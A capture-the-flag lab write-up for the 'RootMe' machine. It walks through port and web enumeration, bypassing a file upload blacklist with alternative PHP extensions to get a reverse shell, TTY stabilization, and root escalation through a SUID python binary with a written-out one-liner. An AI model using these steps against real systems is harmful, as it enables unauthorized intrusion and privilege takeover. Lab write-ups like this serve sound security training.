# RootMe

### Lab objectives

- Identify services exposed on the target host.
- Enumerate the web service attack surface.
- Gain initial access using a file upload feature.
- Escalate privileges to the user with maximum privileges.
- Document commands, evidence, and findings in a reproducible manner.

### Skills to be put into practice

- Recognition and enumeration (Nmap).
- Web enumeration (WhatWeb, Nikto, Gobuster, source code review).
- File upload exploitation and remote command execution (RCE).
- Reverse shell management and TTY stabilization.
- Privilege escalation using SUID binaries (GTFOBins).

### Target IP

**10.66.183.87**

### 1) Initial reconnaissance

A complete port scan and service detection were performed:

```bash
nmap -T5 -sS -sCV -p- --stats-every=5s -Pn 10.66.183.87
```

![image.png](image.png)

**Result:** Only **SSH** and **HTTP** services exposed on the host were identified. Therefore, analysis of the **HTTP** service was prioritized.

### 2) HTTP service enumeration

**Gobuster**, **Nikto**, **WhatWeb**, and **source code** review were used to analyze the web service.

#### Nikto

```bash
nikto -h http://10.66.183.87/
```

#### Gobuster

```bash
gobuster dir -u http://10.66.183.87/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
```

![image.png](image%201.png)

#### WhatWeb

```bash
whatweb http://10.66.183.87/
```

![image.png](image%202.png)

#### Source code review

![image.png](image%203.png)

### 3) Relevant finding

Based on the above results, a **file upload** feature was identified that suggests insufficient validations.

![image.png](image%204.png)

The observed behavior suggests that the form allows the upload of multiple file types and that there is no clear list of allowed extensions (or that the validations are weak).

![image.png](image%205.png)

The existence of the **uploads** directory increases the risk, as it opens up the possibility of executing uploaded content and leading to **RCE (Remote Code Execution)**.

![image.png](image%206.png)

Given that there was an upload point and a potential path to access the uploaded files, a **reverse shell** was prepared (for example, with the support of [https://www.revshells.com/](https://www.revshells.com/)).

![image.png](image%207.png)

A file containing the reverse shell payload was created. As a best practice, it is recommended to use non-descriptive names (e.g., a hash) to reduce the risk of a third party identifying and abusing the file during the testing window.

![image.png](image%208.png)

![image.png](image%209.png)

Once ready, an attempt was made to upload the file. It was observed that the **.php** extension was not allowed:

![image.png](image%2010.png)

This suggests **blacklisting** (explicit blocking of known extensions). Therefore, alternative extensions associated with PHP were tested, such as **.php5**, **.phtml**, **.phar**, among others:

![image.png](image%2011.png)

In this case, the upload was successful. The file was then accessed from the **uploads** directory:

![image.png](image%2012.png)

Upon opening the file, the following was observed:

![image.png](image%2013.png)

To avoid the error observed, it was necessary to set up a listener in a new terminal, using the port defined in the payload (4443):

![image.png](image%2014.png)

Subsequently, the file execution was reloaded and the shell was successfully obtained:

![image.png](image%2015.png)

### 4) TTY stabilization

TTY processing was performed to improve interaction with the obtained session:

1. Spawning TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

1. Suspend the process:

```
Ctrl + Z
```

1. Adjust terminal and return to foreground (on the attacking machine):

```bash
stty raw -echo; fg
```

1. Export terminal variable (on the victim):

```bash
export TERM=xterm
```

### 5) Post-exploitation and local enumeration

Once the session was stabilized, the existing users were enumerated:

![image.png](image%2016.png)

The following users were identified:

- root
- rootme
- test
- ubuntu

An attempt was made to list the sudo privileges of the current user (**www-data**) with `sudo -l`:

![image.png](image%2017.png)

The action was not possible because the required password was not available. Next, directories in **/home** were checked to identify information of interest:

![image.png](image%2018.png)

In this case, no relevant information was identified at first glance. An attempt was made to review the command history of the **rootme** user:

```bash
cat /home/rootme/.bash_history
```

![image.png](image%2019.png)

Permissions to access the file were not available. However, upon further investigation of the **/var/www** directory, the **user.txt** file was found:

![image.png](image%2020.png)

The file corresponds to a *flag*. To continue with the privilege escalation, binaries with **SUID** bits were listed, which can be executed with the owner's privileges (often **root**). The following command was used:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![image.png](image%2021.png)

![image.png](image%2022.png)

### 6) Privilege escalation (SUID)

Of the identified binaries, the following were of greatest interest. **GTFOBins** was consulted to validate abuse vectors: [https://gtfobins.org/](https://gtfobins.org/).

#### Case: Python with SUID

![image.png](image%2023.png)

Command used:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Technical explanation:**

- If `Python` has the **SUID** bit and belongs to **root**, the interpreter runs with elevated effective privileges.
- `os.execl(...)` replaces the current process (Python) with `/bin/sh`.
- The `-p` argument instructs `sh` not to discard effective privileges, so the privileged context inherited from the SUID binary is maintained.

![image.png](image%2024.png)

### 7) Termination

Privilege escalation successfully completed. Control with elevated privileges was obtained and the machine was terminated:

![image.png](image%2025.png)

![image.png](image%2026.png)